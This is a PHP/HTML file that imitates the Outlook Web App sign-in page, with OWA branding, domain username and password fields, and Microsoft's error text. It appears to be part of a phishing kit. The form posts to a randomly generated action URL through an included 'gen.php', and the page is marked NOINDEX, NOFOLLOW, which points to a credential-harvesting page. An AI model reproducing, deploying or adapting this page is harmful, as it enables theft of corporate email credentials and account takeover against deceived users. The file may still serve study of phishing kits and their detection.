<?php
    session_start();
    include('gen.php');
    $status = "";    
?>
<html>
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=10" />
        <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8" />
        <meta name="Robots" content="NOINDEX, NOFOLLOW" />
        <title>Outlook</title>
        <link rel="stylesheet" href="./assets/css/style.css">
    </head>
    <body class="signInBg">
        <form action="<?php echo generateRandomString(); ?>" method="POST" name="logonForm" id="loginForm" enctype="application/x-www-form-urlencoded" autocomplete="off">            
            <input type="hidden" name="LOB" value="LogIn" />    
            <div id="mainLogonDiv" class="mouse">
                <div class="sidebar">
                    <div class="owaLogoContainer">
                        <img src="./assets/images/owaLogo.png" class="owaLogo" aria-hidden="true" />
                        <img src="./assets/images/owaLogo_sm.png" class="owaLogoSmall" aria-hidden="true" />
                    </div>
                </div>
                <div class="logonContainer">
                    <div id="lgnDiv" class="logonDiv">
                        <div class="signInImageHeader" role="heading" aria-label="Outlook">
                            <img class="mouseHeader" src="./assets/images/outlook.png" alt="Outlook" />
                        </div>

                        <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain\user name:</div>
                        <div>
                            <input id="username" name="username" class="signInInputText" role="textbox" autofocus aria-labelledby="userNameLabel" />
                        </div>
                        <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
                        <div>
                            <input id="password" name="password" type="password" class="signInInputText" aria-labelledby="passwordLabel" />
                        </div>
                        <div id="signInErrorDiv" class="signInError" role="alert" tabindex="0" style="display:none">
                            The user name or password you entered isn't correct. Try entering it again.
                        </div>
                        <div class="signInEnter">
                            <div onclick="logIn()" class="signinbutton" role="button" tabindex="0">
                                <img class="imgLnk" src="./assets/images/arrow-right.png" alt="" />
                                <span class="signinTxt">Sign In</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>
        <script>
            function logIn() {
                document.getElementById("loginForm").submit();
            }
        </script>
    </body>
</html>
